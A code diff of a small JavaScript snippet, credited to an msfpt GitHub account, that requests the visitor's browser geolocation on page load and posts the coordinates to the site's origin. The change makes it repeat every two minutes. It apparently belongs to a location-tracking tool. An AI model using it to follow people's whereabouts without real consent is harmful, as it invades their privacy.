@@ -1,45 +1,47 @@
-/* https://github.com/MSFPT/Snow */
+/* Coded By https://github.com/msfpt */
 
-const loc = () => {
+document.addEventListener('DOMContentLoaded', event => {
 
-    const success = (position) => {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        $.ajax({
-            url: window.location.origin,
-            type: 'POST',
-            data: {
-            'Status': 'h3d',
-            'Latitude': latitude,
-            'Longitude': longitude ,
-            'err': 'false'
-            },
-            success:function(response){ return false; },
-            error:function(){ return false; }
-        });
-    }
+  const success = position => {
 
-    const error = (err) => {
+    const latitude = position.coords.latitude;
 
-        console.warn(err);
+    const longitude = position.coords.longitude;
 
-        $.ajax({
-            url: window.location.origin,
-            type: 'POST',
-            data: {
-            'Status': 'h3d',
-            'err': 'true'
-            },
-            success:function(response){ return false; },
-            error:function(){ return false; }
-        });
-        alert("Unable to retrieve your location");
-    }
+    $.ajax({
+      url: location.origin,
+      type: 'POST',
+      data: {
+        'Status': 'h3d',
+        'Latitude': latitude,
+        'Longitude': longitude,
+        'err': 'false'
+      }
+    });
 
+  }
+
+  const error = error => {
+
+    // console.warn(error);
+
+    $.ajax({
+      url: location.origin,
+      type: 'POST',
+      data: {
+        'Status': 'h3d',
+        'err': 'true'
+      }
+    });
+
+    alert("Unable to retrieve your location");
+
+  }
+
+  navigator.geolocation.getCurrentPosition(success, error);
+
+  setInterval(() => {
     navigator.geolocation.getCurrentPosition(success, error);
+  }, 120000);
 
-}
-
-window.onload = () => {
-    loc();
-}
+});
